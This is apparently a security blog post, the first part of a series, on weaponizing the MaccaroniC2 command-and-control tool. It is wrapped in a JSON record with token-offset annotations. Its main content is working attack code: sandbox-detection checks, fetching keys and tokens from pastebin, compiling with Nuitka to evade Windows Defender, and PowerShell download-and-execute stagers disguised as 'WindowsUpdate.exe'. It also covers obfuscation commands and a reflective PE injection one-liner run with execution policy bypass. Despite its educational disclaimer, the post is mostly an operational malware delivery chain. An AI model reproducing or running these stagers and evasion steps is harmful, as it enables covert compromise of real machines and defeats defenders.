{"signal": "title: Inside the Mind of a Cyber Attacker: from Malware creation to Data Exfiltration (Part 1)\nurl: https://blog.hacktivesecurity.com/index.php/2023/06/05/inside-the-mind-of-a-cyber-attacker-from-malware-creation-to-data-exfiltration-part-1/\n\n2\t\t        \n\n\n\n\t\t            0\t\t        \n\n\nDISCLAIMER – This article is provided for educational and informational purposes only. The techniques, tools, and examples discussed are intended to promote a better understanding of cybersecurity and to enhance defensive measures. The usage of these techniques should strictly adhere to applicable laws, regulations, and ethical guidelines. The author and publisher of this article shall not be held responsible for any misuse or illegal activities conducted by individuals or entities based on the information provided.\nAdditionally, it’s important to note that the usage of Ngrok in conjunction with MaccaroniC2 tool may result in the violation of the terms of service or policies of certain platforms. It is advisable to review and comply with the terms of use of any platform or service to avoid potential account bans or disruptions. \n\nIntroduction\nEmbark on a journey into the intricate world of cyber attacks as we unravel paths taken by adversaries from malware creation to data exfiltration.\nIn this comprehensive exploration, we delve into the stages that comprise the attack lifecycle, analyzing the process from infecting to exfiltration, with a particular focus on weaponization.\n\nPresenting MaccaroniC2\nIn this article, we’ll explore MaccaroniC2 ( https://github.com/CalfCrusher/MaccaroniC2 ), a proof-of-concept Command & Control framework that leverages the versatile features of the AsyncSSH Python library ( https://asyncssh.readthedocs.io ) with the integration of PyNgrok, a wrapper for Ngrok ( https://ngrok.com ).\nThis tool is designed to address a specific scenario where the victim operates an AsyncSSH server and establishes an external tunnel, eagerly awaiting commands from the attacker. By harnessing the powerful capabilities of the AsyncSSH library, which provides an exceptional implementation of the SSHv2 protocol, this tool ensures efficient and secure communication between the attacker and the victim.\nSome key features of the AsyncSSH library include:\nAsynchronous Execution: AsyncSSH is built with asynchronous programming in mind, allowing you to perform SSH operations concurrently without blocking the execution flow.\nSSH Protocol Support: It provides support for various SSH protocol versions, including SSH1, SSH2, and the ability to negotiate and handle different encryption and authentication methods.\nKey-Based Authentication: AsyncSSH supports public key authentication, allowing you to authenticate with SSH servers using key pairs instead of passwords.\nSFTP Support: It includes a built-in SFTP (SSH File Transfer Protocol) implementation, enabling you to securely transfer files between the local and remote systems over the SSH connection.\nEvent-driven API: The library follows an event-driven programming model, allowing you to register event handlers and callbacks to handle SSH-related events such as connection establishment, authentication, command execution, and data transfer.\n\nIn a hardened network environment scenario, establishing a connection to an Ngrok server can be easily detected by EDR (Endpoint Detection and Response) systems and other tools designed to monitor network traffic. To avoid raising suspicion and maintaining a higher level of control over the server setup, it is recommended to use a self-hosted server instead of Ngrok. \n\nCheck the project: https://github.com/CalfCrusher/MaccaroniC2\nWeaponizing malware: MaccaroniC2 with steroids\nIn real-world scenarios, it is essential to embrace the mindset of a determined threat actor striving to enhance the effectiveness of their malware while maintaining covert operations.\nWith this objective in mind, we will delve into custom modifications to the server side of MaccaroniC2, uncovering fundamental concepts that enable us to effectively weaponize our tool for diverse real-world scenarios.\n\nVirtualization/Sandbox Evasion are those techniques utilized by adversaries as a part of their defense evasion strategy to detect and avoid virtualization and analysis environments, such as malware analysis sandboxes.\nSandbox evasion is indeed a complex and evolving field. While it’s not possible to cover all aspects of sandbox evasion in just a few lines of Python code, we’ll see some general basic techniques and concepts that can be used to try to recognize a sandbox or a virtual environment:\n# Technique 1: Check for common sandbox-related processes\nsandbox_processes = [\"vmsrvc.exe\",\n                     \"vmusrvc.exe\",\n                     \"vboxservice.exe\",\n                     \"vboxtray.exe\",\n                     \"vmtoolsd.exe\",\n                     \"vmacthlp.exe\",\n                     \"vmtools.exe\",\n                     \"df5serv.exe\"]\nrunning_processes = subprocess.check_output(\"tasklist\", shell=True).decode().lower()\nThis code essentially checks if certain processes that are commonly associated with sandbox environments or virtual machines are running. This information can be helpful in determining whether the code is running in a protected or controlled environment rather than on a regular user’s machine.\n# Technique 3: Check if running in a sandboxed network environment\nsandboxed_networks = [\"10.0.2.\", \"192.168.44.\", \"172.16.0.\", \"172.16.1.\", \"172.16.2.\", \"172.16.3.\",\n                      \"172.16.4.\", \"172.16.5.\", \"172.16.6.\", \"172.16.7.\", \"172.16.8.\", \"172.16.9.\",\n                      \"172.16.10.\", \"172.16.11.\", \"172.16.12.\", \"172.16.13.\", \"172.16.14.\", \"172.16.15.\"]\nlocal_ip = socket.gethostbyname(socket.gethostname())\nHere we can see how this code comparing the local IP address with a predefined list of network addresses typically associated with sandboxed environments. If the local IP address matches any of the addresses in the list, it suggests that the program could be ran in a sandboxed environment. It’s just the first clue but we have to start somewhere ;).\n# Technique 4: Check for virtualized CPU features\ncpu_info = cpuinfo.get_cpu_info()\nvirtualized_cpu_features = [\"hypervisor\", \"vmx\", \"svm\", \"vmm\", \"nx\"]\nif any(feature in cpu_info[\"flags\"] for feature in virtualized_cpu_features):\n    return True  \nHere we can see another piece of code that checks for virtualization by examining the CPU features. It uses the cpuinfo Python module to retrieve information about the CPU. The code defines a list of virtualized CPU features and then checks if any of these features are present in the CPU information’s “flags” field. If any feature is found, the code returns True, indicating the presence of virtualization.\n# Technique 5: Check if disk size is greater than 50 GB\nmin_disk_size_gb = 50\n\nif len(sys.argv) > 1:\n    min_disk_size_gb = float(sys.argv[1])\n\n_, disk_size_bytes, _ = win32api.GetDiskFreeSpaceEx()\n\ndisk_size_gb = disk_size_bytes / 1073741824\n\nif disk_size_gb > min_disk_size_gb:\n    return False # Proceed\nelse:\n    return True # Not Proceed\nThis code checks if the disk size is greater than a specified threshold (50 GB as example). It uses the win32api.GetDiskFreeSpaceEx() function to retrieve the disk size in bytes. It converts the size to gigabytes by dividing it by 1073741824 (the number of bytes in a gigabyte). After comparing the disk size in gigabytes to the specified min_disk_size_gb, if the disk size is greater, the code returns False.\nHowever, if the disk size falls below the minimum threshold, it returns True, signaling that the script should stop from proceeding further because we assume that we’re inside a VM environment or a sandbox.\n\nIt should be noted that these techniques are basic examples and represent fundamental practices in the field of malware development and sandbox detection.\n\nLet’s go further.\n\nIn MaccaroniC2 original tool, the SSH Pub Key is hardcoded. What about requesting it every time script is running ?\nIn this case we choose to host it online  for multiple reasons:\nUsually, attackers employs techniques by leveraging third-party services such pastebin.com and similars, to store piece of code or stagers. This method of operation, widely utilized by advanced threat actors, is a classic within the realm of Advanced Persistent Threats (APTs).\n\nBy employing multiple layers of staging, the attacker artfully conceals the true nature of the malware, placing it several steps removed from the initial infection.\n\ndef get_pub_key():\n    \"\"\"Get SSH pub key from third party service\"\"\"\n\n    try:\n        global PRIVATE_KEY\n        global AUTHORIZED_KEY\n        \n        url = \"https://pastebin.com/raw/XXXXXXX\"\n        r = requests.get(url)\n\n        if r.status_code == 200:\n            pub_key = r.text.strip('\\n')\n        elif r.status_code == 404:\n            exit() # So Long, and Thanks for All the Fish!\n    except:\n        exit('[-] Error: Could not get SSH pub key')\nAs we can see, in this approach we take a different path by avoiding the hardcoding of the pub_key and instead harnessing the advantages provided by services such as pastebin.com, transfersh.com or similar services. It offers flexibility in determining the number of allowed downloads and the duration for which files will be stored.\nAdditionally, some of these platforms even allow for modifying the content of generated URI, enhancing the adaptability and control over the shared resources.\nBy embracing this approach, we could have the capability to generate fresh RSA key pairs, empowering our tool to download a different key in the subsequent system reboot. This becomes particularly valuable when pursuing persistence objectives.\nTo enhance control, we could also incorporate a dedicated function that checks for the removal of the pub_key: if such a detection occurs, then proceed to initiate the removal of its own presence or any existing persistence mechanisms.\nAdditionally, we could incorporate a special Canary Token within our script:\nCanary tokens are unique markers that are placed within systems or scripts to act as early warning indicators. They allow us to detect specific events or actions with an extensive range of options to create decoy assets, each designed to provide valuable intelligence and real-time notifications: \nfrom email alerts to webhook integrations and many other features for monitoring and security needs. \nFor further information check official site: https://canarytokens.org/generate\nIn our case, we could configure the script to perform a designated action if the URI is no longer accessible, such as notifying us if the file has been removed. When the script fails to download the id_rsa.pub key, it triggers a canary token, which generates a signal after encountering a 404 error status code.\nIn this case we received an email alerting us of the event.\n\nDynamic and crypted AUTH Ngrok Token\nIn MaccaroniC2 original tool, the Ngrok Auth Token is hardcoded also.\nIn this scenario, we’ll apply a similar approach as before, but with a slight twist: we want to avoid publicly uploading our token in plain text. \nTo achieve this, we’ll encrypt the token and upload it to a file-sharing service like transfersh.com\nThe script will download and decrypt the string that represents the token. This decryption process utilizes the Fernet algorithm, ensuring the secure retrieval and utilization of the token.\nFernet is a symmetric encryption algorithm and token format used for secure communication and data protection. It is a part of the cryptography library in Python called “cryptography.” It utilizes symmetric key cryptography, where the same secret key is used for both encryption and decryption. It ensures confidentiality and integrity of data by combining encryption with a message authentication code (MAC).\nThe Fernet token format includes the encrypted data and a timestamp to prevent tampering. It provides a straightforward and secure way to encrypt and authenticate data, making it suitable for various applications that require secure communication and storage.\n\ndef fernet_decrypt(encrypted_string, password):\n    \"\"\"Decrypt Ngrok AUTH Token\"\"\"\n\n    try:\n        key = generate_key_from_password(password)\n        cipher = Fernet(key)\n        decrypted_message = cipher.decrypt(encrypted_string)\n\n        return decrypted_message.decode()\n    except:\n        exit('[-] Error: Could not decrypt AUTH Token')\n\ndef get_auth_token():\n    \"\"\"Get AUTH Token from third party service\"\"\"\n\n    try:        \n        url = \"https://pastebin.com/raw/YYYYYY\"\n        r = requests.get(url)\n\n        if r.status_code == 200:\n            password_for_decrypt = 'P4ssw0rd!'\n            crypted_data = r.text.strip('\\n')\n            \n            return fernet_decrypt(crypted_data, password_for_decrypt)\n\n        elif r.status_code == 404:\n            # Here we could insert a request to a canary token to be notified of the event if the file is not found\n            # - for persistence purpose -\n            exit() # So Long, and Thanks for All the Fish!\n    except:\n        exit('[-] Error: Could not get AUTH Token')\n\nThe provided code includes two functions: fernet_decrypt and get_auth_token.\nThe fernet_decrypt function decrypts an encrypted string representing the Ngrok AUTH Token using a harcoded password. It returns the decrypted message as a decoded string.\nThe get_auth_token function retrieves the AUTH Token from a third-party service, in this example pastebin. It checks the response status code and proceeds accordingly. If the response is successful, it use the harcoded password for decryption using the fernet_decrypt function, and returns the decrypted AUTH Token.\nIf the response status code is 404, we can say attack is concluded and we could insert a potential a canary token for notification purposes .\nThese examples provide ideas and possibilities, showcasing how attackers can leverage High-Level languages like Python to weaponize and elevate the capabilities of their malware.\n\nCheck full project of custom MaccaroniC2 server at: \nhttps://github.com/hacktivesec/MaccaroniC2/blob/main/weaponized_server.py\n\nPrepararing Cannons: Nuitka in action\nPython Nuitka is a specialized compiler for Python. It’s designed to convert Python code into highly optimized C/C++ code, which is then compiled into native machine code. The resulting executable can be distributed and executed without requiring the Python interpreter to be installed on the target system.\nWhen it comes to compiling malware, Nuitka offers some potential advantages over other Python compilers such as PyInstaller or Py2exe:\nPerformance: Nuitka Compiler aims to generate highly optimized C/C++ code, which can result in improved performance compared to interpreted Python code. This can be advantageous for malware authors who want their malicious code to execute more efficiently and quickly.\nReduced Dependencies: By compiling Python code into standalone executables, Nuitka Compiler eliminates the need for the target system to have a Python interpreter installed. This can make the malware distribution easier and less reliant on specific Python versions or configurations.\nCode Protection: Nuitka Compiler employs various optimization techniques and obfuscation mechanisms during the compilation process. This can make the resulting executable more challenging to reverse-engineer and analyze, adding an extra layer of protection for the malware.\nDetection Evasion: As Nuitka Compiler generates native machine code, it can potentially evade certain signature-based detection methods used by security tools that primarily focus on detecting interpreted Python scripts. This may offer a limited advantage in evading detection by some antivirus or security solutions.\n\nInstallation and compilation is straightforward:\npython -m pip install nuitka\npython -m nuitka --standalone --onefile maccaronic2_server.py\nOur newly generate PE file is ready to go. We can proceed to test this under the presence of Windows Defender, ensuring that all settings, including Cloud Protection and Antitamper modes are enabled. This will allow us to evaluate the effectiveness of our malware in evading the defensive measures implemented by Windows Defender.\nNice ! In the absence of advanced evasion techniques such as binders, packers, and crypters, our ‘malware’ effectively bypasses Windows Defender without relying on complex obfuscation methods.\nLet’s try on VirusTotal\nNot bad !\nWhile some vendors were able to spot the malware itself, they seemed to focus on detecting the use of the Nuitka compiler. Recognizing this pattern, i realized that by making targeted modifications to the Nuitka compiler code, we could potentially achieve 100% FUD (Fully Undetected) obfuscation.\nHowever, it is crucial to remember that this approach requires a deep understanding of both malware detection techniques employed by antiviruses. It also demands continuous research and adaptation as antivirus technologies evolve. This just opens up new possibilities for evading detection, when using Python to develop malware.\nIt should be noted anyway in the world of real malware development, seasoned and skilled adversaries often turn to programming languages such as C and C++ to craft their malicious creations at a lower level.\nWhile higher-level languages like Python offer ease of use and rapid development, the power and control provided by lower-level languages are paramount in the realm of sophisticated malware: one of the primary reasons for choosing C and C++ is the level of control they provide over system resources and hardware. These languages allow direct memory manipulation, access to system APIs, and the ability to write efficient and optimized code.\nThis level of control enables malware developers to create stealthy, complex, and tailored malicious functionalities that can evade detection and exploit vulnerabilities in the targeted environment.\nWindows Shortcut (LNK)\n“Weaponize” is a term that refers to the first phase of the kill chain and it is categorized as the Build Capabilities technique under Resource Development tactic of the MITRE ATT&CK framework.\nBuilding capabilities consist of creating custom payloads, post-compromise and remote access tool development, creating infected removable media, and similar techniques. The goal is to create and deliver the first payload to the target according to the environment.\nSeveral tools are available to create an initial payload, such as a self-extracting archive (SFX). A classic technique used mostly by Advanced Persistent Threat (APT) groups is the use of LNK files when delivering malware: shortcut files that point to other files.\nThese files have been used as an attack vector as early as 2013. For example, the APT group Gamaredon has put LNK files to work, including a campaign that started in August 2022 against organizations in Ukraine.\nAttackers are using LNK files to download malware or other malicious files by leveraging legitimate native apps, such as PowerShell.\nFor instance, this is a PowerShell one-liner that can be used to download and execute a remote .ps1 or .exe file:\npowershell \"IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/malicious.ps1')\"\nThe .ps1 file could be a simple stager download of an .exe file and its execution. This is a clever technique that has been used for years, including in the Stuxnet attacks that were first uncovered in 2010.\nIt’s an effective technique because it exploits a fundamental feature of Windows, which is to automatically launch executables using the metadata stored in the LNK file.\nThe .ps1 file can also be a complex script that can also achieve persistence with more functionalities.\nSome attackers go even further by appending the stager to the LNK file. In this case, the PowerShell one-liner will find, decrypt, and execute code appended to the original file. Lastly, this will run a series of “stagers” with the object to delivery the final malware inside the victim’s computer.\n\nAn ounce of practice is worth more than tons of preaching\nGandhi\nAfter theory, comes practice!\nOne Shot, One Kill – Upload PE File\nBefore start coding the .ps1 stager, we need to upload the PE file build early, using transfersh.com:\ncurl -H \"Max-Downloads: 1\" -H \"Max-Days: 5\" --upload-file ./final_server.exe https://transfersh.com/WindowsUpdate\nOutput: https://transfersh.com/XXXXXXXX/WindowsUpdate\nAfter one download the file will be deleted and link will returns a 404 error. We can choose also how many days the file be stored.\nPowershell  Stager / Dropper \n$down = New-Object System.Net.WebClient\n$url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate'\n$file = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate.exe')\n$down.DownloadFile($url, $file)\n$exec = New-Object -ComObject shell.application\n$exec.ShellExecute($file)\nThis is a simple PowerShell script that downloads a file from a fixed location and executes it.\nHere’s what each line does:\n$down = New-Object System.Net.WebClient\nThis line creates a new WebClient object and assigns it to the variable $down. The WebClient class provides common methods for sending data to and receiving data from a resource identified by a URI.\n$url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate'\nThis line sets the value of the $url variable to the URL of the file to be downloaded.\n$file = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate.exe')\nThis line uses the Combine method of the Path class to combine the temporary folder path (retrieved using the GetTempPath method) with the file name ‘WindowsUpdate.exe’. The resulting path is assigned to the $file variable.\n$down.DownloadFile($url, $file)\nThis line uses the DownloadFile method of the WebClient object to download the file from the specified URL and save it to the specified local file path.\n$exec = New-Object -ComObject shell.application\nThis line creates a new Shell.Application COM object and assigns it to the $exec variable. The Shell.Application object provides methods for working with the Windows shell.\n$exec.ShellExecute($file)\nThis line uses the ShellExecute method of the Shell.Application object to execute the downloaded file.\n\nBut we want more. It’s important to note that we have previously configured the Max-Download parameter to a one-shot only download.\nIn addition to the previous modifications, we now aim to keep track of every attempt to execute our stager after the initial compromise: whenever a 404 error is detected, indicating that the file is no longer available on the server, we’ll request a URL using canarytokens.org\nAs said early this serves as a signal to log the event and provides valuable information for monitoring and analysis purposes.\nPowershell  Stager with trigger\n$down = New-Object System.Net.WebClient\n$url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate'\n$file = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate.exe')\n\n$request = [System.Net.WebRequest]::Create($url)\n$request.Method = 'HEAD'\n$response = $null\n\ntry {\n    $response = $request.GetResponse()\n    $statusCode = [int]$response.StatusCode\n\n    if ($statusCode -eq 200) {\n        # Successful response with HTTP status code 200\n        $down.DownloadFile($url, $file)\n\t\t$exec = New-Object -ComObject shell.application\n\t\t$exec.ShellExecute($file)\n    }\n} catch [System.Net.WebException] {\n    $statusCode = [int]$_.Exception.Response.StatusCode\n\n    if ($statusCode -eq 404) {\n        # File not found, make a GET request to a fixed URI generated on canarytokens.org\n        $fixedUrl = 'http://canarytokens.com/feedback/about/XXXXXXXXXX/submit.aspx'\n        $response = $down.DownloadString($fixedUrl)\n    } else {\n        throw\n    }\n}\nBy implementing a smart error handling mechanism we can enhance our system’s monitoring capabilities: upon receiving a 404 response from a specific URL, we can trigger a subsequent GET request to a fixed URI generated on canarytokens.org.\nThis script will not trigger AMSI (Antimalware Scan Interface), providing an advantage in evading detection. However, to add an extra layer of complexity and challenge for malware analysts, we will apply some obfuscation techniques using a helpful tool like Chameleon: https://github.com/klezVirus/chameleon\nThis tool has been developed as a Python port of the Chimera project, by tokioneon_.\nAs such, it uses mostly the same techniques to evade common detection signatures, like:\ncomment deletion/substitution\nstring substitution (variables, functions, data-types)\nvariable concatenation\nindentation randomization\nsemi-random backticks insertion\ncase randomization\nencoding\nLet’s try:\npython chameleon.py -n -v -b -K hacktivesec -t h .\\download-execute_full.ps1 -o obfuscated_stager.ps1\nBy incorporating obfuscation techniques our script becomes a little bit more challenging to analyze.\n\nIt should be noted that this entire procedure will leave traces on filesystem. The PE file is downloaded on filesystem and than executed. To enhance operational security, we can employ a clever alternative approach that eliminates the need to download files directly onto the victim’s computer: PE reflective injection.\n\n\nReflective PE injection\nReflective PE injection is a technique used by malware or advanced attackers to inject a Portable Executable (PE) file directly into the memory of a running process without the need for writing the file to disk. Unlike traditional injection methods, which involve loading an external DLL or injecting code into the target process, reflective PE injection allows the malware to load and execute its code directly from memory.\nThe term “reflective” refers to the ability of the injected code to reflect upon itself and perform necessary operations to execute within the process’s memory space. This technique is often employed to bypass security mechanisms that monitor or block external DLL loading or code injection.\nIn reflective PE injection, the PE file is parsed and its sections are reconstructed in the target process’s memory. The necessary data structures, such as headers and import tables, are reconstructed as well. By doing so, the injected code can appear as a legitimate part of the process, making it more difficult to detect and analyze.\nOnce the PE file is injected and reconstructed in memory, the execution flow can be redirected to the injected code, enabling the malware to operate within the context of the compromised process.\nThis technique provides several advantages to attackers, including stealthiness, persistence, and the ability to leverage the privileges and resources of the compromised process.\nPowerSploit does provide a module called “Invoke-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell. This module allows the injection of a PE file into a remote or local process’s memory without writing it to disk, but being a well-known and widely-used tool, it has gained significant attention from security vendors and technologies, including the Antimalware Scan Interface (AMSI).\nAs a result, AMSI has become increasingly adept at detecting and flagging the usage of PowerSploit’s modules and techniques and other famous tools. But we’ll see how to bypass this.\nPowershell Stager with Invoke-ReflectivePEInjection\n(New-Object System.Net.WebClient).DownloadString('https://example.com/ReflectivePEInjection.ps1') | IEX\n$remoteUrl = \"https://transfersh.com/XXXXXXX/whatever.exe\"\n$webClient = New-Object System.Net.WebClient\n$PEBytes = $webClient.DownloadData($remoteUrl)\nInvoke-ReflectivePEInjection -PEBytes $PEBytes\nWe can host this script somewhere and then run as usually in a fancy oneliner like:\npowershell -nop -exec bypass -c \"(New-Object System.Net.WebClient).DownloadString('https://transfersh.com/XXXXXXX/runme.ps1') | IEX\"\nIn this way, we can directly run the executable in the memory of a running process without the need to write the file to disk.\nHowever when AMSI (Antimalware Scan Interface) is activated, it will alert us, as mentioned before.\nConclusion\nThe first part of this article concludes here, however, our exploration doesn’t end here!\nIn the next upcoming article, we will dive deep into the intricacies of bypassing AMSI, unraveling detailed techniques and methods that will empower us to evade it. We will also explore cutting-edge countermeasures to enhance our offensive capabilities.\nMoreover, we’ll delve into a wide range of exciting topics, including:\nUser-level persistence to establish long-term presence and maintain access on compromised systems.\nExploring advanced exfiltration techniques, enabling the covert transfer of sensitive data from target environments.\nSpawning new Command and Control (C2) agents, expanding our reach and maintaining resilient communication channels.\nHijack Execution Flow: the art of DLL Side-Loading !\n\nThank you for reading!\nReferences\n\n\n\n\n\n\n\n\n\n\n                        Happy                    \n\n0\n0 %\n\n\n\n\n\n\n                        Sad                    \n\n0\n0 %\n\n\n\n\n\n\n                        Excited                    \n\n1\n100 %\n\n\n\n\n\n\n                        Sleepy                    \n\n0\n0 %\n\n\n\n\n\nAngry\n\n0\n0 %\n\n\n\n\n\nSurprise\n\n0\n0 %\n", "metadata": {"phasesDone": ["zone", "token", "content"]}, "asets": [{"type": "zone", "hasID": false, "hasSpan": true, "attrs": [{"name": "region_type", "type": "string", "aggregation": null}], "annots": [[0, 29228, "body"]]}, {"type": "lex", "hasID": false, "hasSpan": true, "attrs": [], "annots": [[0, 5], [5, 6], [7, 13], [14, 17], [18, 22], [23, 25], [26, 27], [28, 33], [34, 42], [42, 43], [44, 48], [49, 56], [57, 65], [66, 68], [69, 73], [74, 86], [87, 88], [88, 92], [93, 94], [94, 95], [96, 99], [99, 100], [101, 106], [106, 109], [109, 113], [113, 114], [114, 130], [130, 131], [131, 134], [134, 135], [135, 140], [140, 141], [141, 144], [144, 145], [145, 149], [149, 150], [150, 152], [152, 153], [153, 155], [155, 156], [156, 240], [240, 241], [241, 242], [244, 245], [273, 274], [287, 297], [298, 299], [300, 304], [305, 312], [313, 315], [316, 324], [325, 328], [329, 340], [341, 344], [345, 358], [359, 367], [368, 372], [372, 373], [374, 377], [378, 388], [388, 389], [390, 395], [395, 396], [397, 400], [401, 409], [410, 419], [420, 423], [424, 432], [433, 435], [436, 443], [444, 445], [446, 452], [453, 466], [467, 469], [470, 483], [484, 487], [488, 490], [491, 498], [499, 508], [509, 517], [517, 518], [519, 522], [523, 528], [529, 531], [532, 537], [538, 548], [549, 555], [556, 564], [565, 571], [572, 574], [575, 585], [586, 590], [590, 591], [592, 603], [603, 604], [605, 608], [609, 616], [617, 627], [627, 628], [629, 632], [633, 639], [640, 643], [644, 653], [654, 656], [657, 661], [662, 669], [670, 675], [676, 679], [680, 682], [683, 687], [688, 699], [700, 703], [704, 707], [708, 714], [715, 717], [718, 725], [726, 736], [737, 746], [747, 749], [750, 761], [762, 764], [765, 773], [774, 779], [780, 782], [783, 786], [787, 798], [799, 807], [807, 808], [809, 821], [821, 822], [823, 827], [828, 837], [838, 840], [841, 845], [846, 850], [851, 854], [855, 860], [861, 863], [864, 869], [870, 872], [873, 884], [885, 889], [890, 901], [902, 906], [907, 910], [911, 917], [918, 920], [921, 924], [925, 934], [935, 937], [938, 941], [942, 947], [948, 950], [951, 958], [959, 961], [962, 970], [971, 973], [974, 981], [982, 991], [991, 992], [993, 995], [996, 998], [999, 1008], [1009, 1011], [1012, 1018], [1019, 1022], [1023, 1029], [1030, 1034], [1035, 1038], [1039, 1044], [1045, 1047], [1048, 1051], [1052, 1054], [1055, 1058], [1059, 1067], [1068, 1070], [1071, 1078], [1079, 1081], [1082, 1087], [1088, 1097], [1098, 1105], [1106, 1110], [1111, 1113], [1114, 1125], [1125, 1126], [1129, 1141], [1142, 1148], [1149, 1151], [1152, 1153], [1154, 1161], [1162, 1166], [1167, 1170], [1171, 1180], [1181, 1186], [1187, 1189], [1190, 1195], [1196, 1203], [1204, 1206], [1207, 1209], [1210, 1217], [1218, 1223], [1224, 1229], [1230, 1232], [1233, 1244], [1245, 1249], [1250, 1257], [1258, 1266], [1267, 1269], [1270, 1274], [1275, 1287], [1287, 1288], [1289, 1291], [1292, 1296], [1297, 1310], [1311, 1322], [1322, 1323], [1324, 1326], [1327, 1332], [1333, 1337], [1338, 1341], [1342, 1348], [1349, 1353], [1354, 1362], [1363, 1366], [1367, 1373], [1374, 1383], [1383, 1384], [1385, 1394], [1395, 1398], [1399, 1406], [1407, 1411], [1412, 1421], [1422, 1424], [1425, 1437], [1437, 1438], [1439, 1443], [1444, 1445], [1446, 1456], [1457, 1462], [1463, 1465], [1466, 1479], [1479, 1480], [1482, 1492], [1493, 1504], [1505, 1507], [1508, 1512], [1513, 1520], [1520, 1521], [1522, 1527], [1528, 1535], [1536, 1547], [1548, 1549], [1550, 1555], [1555, 1558], [1558, 1564], [1564, 1565], [1565, 1568], [1568, 1569], [1569, 1580], [1580, 1581], [1581, 1592], [1593, 1595], [1596, 1597], [1598, 1614], [1615, 1622], [1623, 1624], [1625, 1632], [1633, 1642], [1643, 1647], [1648, 1657], [1658, 1661], [1662, 1671], [1672, 1680], [1681, 1683], [1684, 1687], [1688, 1696], [1697, 1703], [1704, 1711], [1712, 1713], [1714, 1719], [1719, 1722], [1722, 1730], [1730, 1731], [1731, 1742], [1742, 1743], [1743, 1745], [1746, 1747], [1748, 1752], [1753, 1756], [1757, 1768], [1769, 1771], [1772, 1779], [1779, 1780], [1781, 1782], [1783, 1790], [1791, 1794], [1795, 1800], [1801, 1802], [1803, 1808], [1808, 1811], [1811, 1816], [1816, 1817], [1817, 1820], [1821, 1823], [1824, 1828], [1829, 1833], [1834, 1836], [1837, 1845], [1846, 1848], [1849, 1856], [1857, 1858], [1859, 1867], [1868, 1876], [1877, 1882], [1883, 1886], [1887, 1893], [1894, 1902], [1903, 1905], [1906, 1914], [1915, 1921], [1922, 1925], [1926, 1937], [1938, 1940], [1941, 1949], [1950, 1956], [1956, 1957], [1958, 1965], [1966, 1974], [1975, 1983], [1984, 1988], [1989, 1992], [1993, 2001], [2001, 2002], [2003, 2005], [2006, 2016], [2017, 2020], [2021, 2029], [2030, 2042], [2043, 2045], [2046, 2049], [2050, 2058], [2059, 2066], [2066, 2067], [2068, 2073], [2074, 2082], [2083, 2085], [2086, 2097], [2098, 2112], [2113, 2115], [2116, 2119], [2120, 2125], [2126, 2134], [2134, 2135], [2136, 2140], [2141, 2145], [2146, 2153], [2154, 2163], [2164, 2167], [2168, 2174], [2175, 2188], [2189, 2196], [2197, 2200], [2201, 2209], [2210, 2213], [2214, 2217], [2218, 2224], [2224, 2225], [2226, 2230], [2231, 2234], [2235, 2243], [2244, 2246], [2247, 2250], [2251, 2259], [2260, 2267], [2268, 2275], [2275, 2276], [2277, 2289], [2290, 2299], [2299, 2300], [2301, 2309], [2310, 2312], [2313, 2318], [2319, 2323], [2324, 2336], [2337, 2348], [2349, 2351], [2352, 2356], [2356, 2357], [2358, 2366], [2367, 2370], [2371, 2373], [2374, 2381], [2382, 2385], [2386, 2396], [2397, 2409], [2410, 2417], [2418, 2426], [2427, 2430], [2431, 2440], [2441, 2445], [2445, 2446], [2447, 2450], [2451, 2459], [2460, 2467], [2467, 2468], [2469, 2471], [2472, 2480], [2481, 2488], [2489, 2492], [2493, 2500], [2501, 2504], [2505, 2513], [2514, 2522], [2522, 2523], [2524, 2533], [2534, 2538], [2538, 2539], [2540, 2544], [2544, 2545], [2546, 2549], [2550, 2553], [2554, 2561], [2562, 2564], [2565, 2574], [2575, 2578], [2579, 2585], [2586, 2595], [2596, 2606], [2607, 2610], [2611, 2625], [2626, 2633], [2633, 2634], [2635, 2644], [2645, 2659], [2659, 2660], [2661, 2669], [2670, 2678], [2679, 2685], [2686, 2689], [2690, 2704], [2704, 2705], [2706, 2714], [2715, 2718], [2719, 2721], [2722, 2734], [2735, 2739], [2740, 2743], [2744, 2751], [2752, 2757], [2758, 2761], [2762, 2767], [2768, 2775], [2776, 2778], [2779, 2788], [2788, 2789], [2790, 2794], [2795, 2802], [2802, 2803], [2804, 2806], [2807, 2815], [2816, 2817], [2818, 2826], [2827, 2831], [2832, 2833], [2833, 2836], [2837, 2841], [2842, 2850], [2851, 2859], [2859, 2860], [2861, 2875], [2875, 2876], [2877, 2885], [2886, 2889], [2890, 2892], [2893, 2901], [2902, 2910], [2911, 2916], [2917, 2924], [2925, 2928], [2929, 2934], [2935, 2938], [2939, 2945], [2946, 2953], [2954, 2958], [2959, 2962], [2963, 2966], [2967, 2977], [2977, 2978], [2979, 2991], [2992, 2995], [2995, 2996], [2997, 3000], [3001, 3008], [3009, 3016], [3017, 3019], [3020, 3032], [3033, 3044], [3045, 3050], [3050, 3051], [3052, 3060], [3061, 3064], [3065, 3067], [3068, 3076], [3077, 3082], [3083, 3091], [3092, 3095], [3096, 3105], [3106, 3108], [3109, 3115], [3116, 3127], [3128, 3134], [3135, 3139], [3140, 3142], [3143, 3153], [3154, 3167], [3167, 3168], [3169, 3183], [3183, 3184], [3185, 3192], [3193, 3202], [3202, 3203], [3204, 3207], [3208, 3212], [3213, 3221], [3221, 3222], [3224, 3226], [3227, 3228], [3229, 3237], [3238, 3245], [3246, 3257], [3258, 3266], [3266, 3267], [3268, 3280], [3281, 3282], [3283, 3293], [3294, 3296], [3297, 3299], [3300, 3305], [3306, 3312], [3313, 3316], [3317, 3319], [3320, 3326], [3327, 3335], [3336, 3338], [3339, 3342], [3343, 3344], [3344, 3352], [3353, 3362], [3363, 3366], [3367, 3375], [3375, 3376], [3377, 3384], [3385, 3388], [3389, 3394], [3395, 3400], [3401, 3409], [3410, 3412], [3413, 3420], [3421, 3428], [3429, 3436], [3436, 3437], [3438, 3440], [3441, 3446], [3447, 3454], [3455, 3464], [3465, 3468], [3469, 3480], [3481, 3482], [3483, 3489], [3490, 3495], [3496, 3498], [3499, 3506], [3507, 3511], [3512, 3515], [3516, 3522], [3523, 3528], [3528, 3529], 